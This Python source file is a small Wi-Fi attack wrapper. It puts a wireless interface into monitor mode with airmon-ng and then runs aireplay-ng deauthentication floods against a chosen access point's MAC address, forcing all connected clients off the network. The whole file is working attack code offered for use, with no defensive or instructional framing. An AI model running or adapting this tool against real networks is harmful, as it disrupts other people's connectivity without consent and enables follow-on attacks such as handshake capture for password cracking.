import subprocess,os
class wlan_interface:
    def __init__(self,interface,channel:int=None):
        self.interface = interface
        self.channel=channel
        self.Stop_interface()
        self.Start_interface()
    def Stop_interface(self):
        if "mon" in self.interface:
            print(f"Stopping {self.interface} Monitor mode")
            try:
                out = subprocess.check_output(["sudo","airmon-ng","stop",self.interface]).decode()
            except:
                return Exception(f'ERR: ["airmon-ng","stop",{self.interface}] FAILED')
            if f"monitor mode vif disabled for [phy1]{self.interface}" in out:
                print(f"Stopped {self.interface}")
            self.interface=self.interface.split("mon")[0]
    def Start_interface(self,channel:int=None):
        #if "mon" in self.interface:
        #    self.Stop_interface()
        print(f"Starting {self.interface}{f' on channel {channel if channel and not channel==self.channel else self.channel}' if channel or self.channel else ''}")
        try:
            out = subprocess.check_output(["sudo","airmon-ng", "start",self.interface,channel if channel else self.channel if self.channel else '']).decode()
        except Exception as e:
            print(f"{self.interface} {f'on channel {channel if channel and not channel==self.channel else self.channel} ' if channel or self.channel else ''}could not be started! \n{e}")
            return
#            raise Exception(f"{self.interface} {f'on channel {channel if channel and not channel==self.channel else self.channel} ' if channel or self.channel else ''}could not be started! \n{e}")
        if f"monitor mode vif enabled for [phy1]{self.interface} on [phy1]{self.interface}mon" in out:
            print("Success!")
        if "mon" not in self.interface:
            self.interface=self.interface+"mon"
        self.channel=channel if not channel == self.channel else self.channel
class bssid:
    def __init__(self,MAC,channel:int or str=None,name:str=None) -> None:
        self.MAC = MAC
        self.channel = channel
        self.name = name
    def configure_interface(self,interface:wlan_interface,channel:int or str=None):
        #interface.Stop_interface()
        interface.Start_interface(channel if channel and not channel==self.channel else self.channel)
        if channel and not channel==self.channel: self.channel == channel
    def Deauth(self,interface:wlan_interface,amount:int=1):
        if not interface.channel == self.channel:
            self.configure_interface(interface)
        print(f"DeAuthing {self.MAC} {self.channel} on interface {interface.interface}")
        out=None
        try:
            out=subprocess.check_output(["sudo","aireplay-ng", "-0", str(amount), "-a", self.MAC, interface.interface])
        except Exception as e:
            print(f"DeAuth on {self.MAC} {self.channel} on interface {interface.interface} Failed!\n{e}")
        if out:
            if f"Sending DeAuth (code 7) to broadcast" in out.decode():
                print("DeAuth Sent!")
        return interface
    